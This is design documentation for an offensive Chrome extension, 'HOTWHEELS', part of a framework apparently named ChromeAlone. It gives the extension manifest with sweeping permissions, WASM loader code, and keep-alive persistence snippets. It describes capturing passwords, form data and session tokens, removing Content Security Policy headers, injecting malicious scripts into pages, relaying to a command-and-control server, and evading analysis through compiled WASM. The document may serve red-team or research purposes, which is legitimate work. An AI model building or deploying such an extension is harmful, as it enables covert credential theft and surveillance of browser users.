# HOTWHEELS - Browser Extension Agent Component

## Overview
HOTWHEELS is the primary browser extension agent of ChromeAlone that executes on target systems. It combines a traditional Chrome extension architecture with WebAssembly (WASM) modules to provide advanced capabilities while evading detection. The extension serves as the main execution environment for ChromeAlone operations within the browser context.

## What is HOTWHEELS?

HOTWHEELS is a sophisticated browser extension that:
1. **Maintains Persistent Execution** - Runs continuously in the browser background
2. **Executes WASM Payloads** - Loads compiled Go code for advanced functionality
3. **Monitors User Activity** - Captures form data, keystrokes, and authentication events

## Technical Deep Dive

### Chrome Extension Architecture

#### Understanding Chrome Extension Components

Modern Chrome extensions (Manifest V3) consist of several contexts:

**Service Worker (Background Script)**:
- Persistent execution environment that survives tab closures
- Handles extension lifecycle and inter-component communication
- Has access to all Chrome APIs and can make network requests
- Cannot directly access webpage DOM content

**Content Scripts**:
- Execute in the context of web pages
- Can access and modify webpage DOM
- Run in isolated JavaScript worlds separate from page scripts
- Limited Chrome API access for security

**Extension Manifest**:
- Declares permissions, resources, and behavioral policies
- Defines content script injection rules and execution timing
- Specifies service worker and web-accessible resources

#### HOTWHEELS Extension Structure

**Manifest Configuration (`manifest.json`)**:
```json
{
  "manifest_version": 3,
  "name": "ChromeAlone",
  "permissions": [
    "activeTab", "background", "clipboardRead", "cookies", 
    "declarativeNetRequest", "history", "nativeMessaging", 
    "scripting", "tabs"
  ],
  "host_permissions": ["<all_urls>"],
  "content_scripts": [
    {
      "matches": ["<all_urls>"],
      "js": ["wasm/wasm_exec.js", "content.js"],
      "run_at": "document_end"
    }
  ]
}
```

**Permission Analysis**:
- `<all_urls>` - Universal website access
- `nativeMessaging` - Communication with native applications
- `declarativeNetRequest` - Network request modification (mainly used by PAINTBUCKET)
- `scripting` - Dynamic code injection capabilities
- `clipboardRead` - Access to clipboard contents

### WebAssembly (WASM) Integration

#### Understanding WebAssembly in Browser Extensions

WebAssembly provides several advantages for malicious extensions:

**Performance Benefits**:
- Near-native execution speed for computationally intensive tasks
- Efficient binary format reduces payload size
- Compiled code is harder to analyze than JavaScript

**Security Evasion**:
- Binary format obscures functionality from static analysis
- Traditional JavaScript-based security tools may not analyze WASM
- Can implement complex algorithms that would be obvious in JavaScript

**Language Flexibility**:
- Allows using languages like Go, Rust, or C++ in browser environment
- Enables code reuse from existing native tools and libraries

#### HOTWHEELS WASM Architecture

**Background Script WASM Loading (`background.js`)**:
```javascript
async function Startup() {
    if (globalThis.started) return;
    globalThis.started = true;

    const go = new Go();  // Go WASM runtime
    WebAssembly.instantiateStreaming(
        fetch('./wasm/background.wasm'), 
        go.importObject
    ).then(result => {
        go.run(result.instance);  // Execute Go code
    });
}
```

**Content Script WASM Loading (`content.js`)**:
```javascript
async function loadWASM() {
    const go = new Go();
    const wasmModule = await WebAssembly.instantiateStreaming(
        fetch(chrome.runtime.getURL('wasm/main.wasm')),
        go.importObject
    );
    go.run(wasmModule.instance);
}
```

**Dual WASM Architecture**:
- `background.wasm` - Executes in service worker context with full extension privileges
- `main.wasm` - Executes in content script context with DOM access
- Each WASM module contains compiled Go code for specific functionality. Code for these capabilities can be found in the the `wasm` folder within this project.

### Go-Based WASM Implementation

#### Background Script Functionality (`wasm/background-script/`)

The background WASM module (`background.wasm`) handles:

**Network Security Bypass**:
- Removes Content Security Policy headers via `declarativeNetRequest`
- Disables X-Frame-Options and other security headers
- Enables arbitrary code injection into protected websites

**Extension Lifecycle Management**:
- Maintains persistent execution across browser restarts
- Handles communication with the ChromeAlone Isolated Web Application (BLOWTORCH) which handles communications with the command & control server.
- Coordinates with other ChromeAlone components

#### Content Script Functionality (`wasm/content-script/`)

The content WASM module (`main.wasm`) provides:

**Form Data Interception**:
- Monitors all form submissions on visited websites
- Captures usernames, passwords, and sensitive data
- Tracks authentication flows and session tokens

**DOM Manipulation**:
- Modifies webpage content in real-time
- Injects malicious JavaScript into page execution context
- Monitors user interactions and input events

### Persistence and Evasion Mechanisms

#### Service Worker Persistence

Chrome's Manifest V3 architecture uses service workers that can be terminated to save resources. In order to make sure that our background script runs forever, HOTWHEELS implements several persistence techniques:

**Keep-Alive Mechanism**:
```javascript
// Prevent service worker termination - this is a necessary hack or our worker will be suspended
const keepAlive = () => setInterval(chrome.runtime.getPlatformInfo, 20e3);
chrome.runtime.onStartup.addListener(keepAlive);
keepAlive();
```

**Multi-Trigger Startup**:
```javascript
// Handle various startup scenarios
chrome.runtime.onInstalled.addListener(Startup);
chrome.runtime.onStartup.addListener(Startup);
setTimeout(Startup, 5000);  // Fallback for race conditions
```

#### Detection Evasion

**WASM Code Obscuration**:
- Binary format makes reverse engineering difficult
- Go compilation produces optimized machine code
- Function names and debug symbols are stripped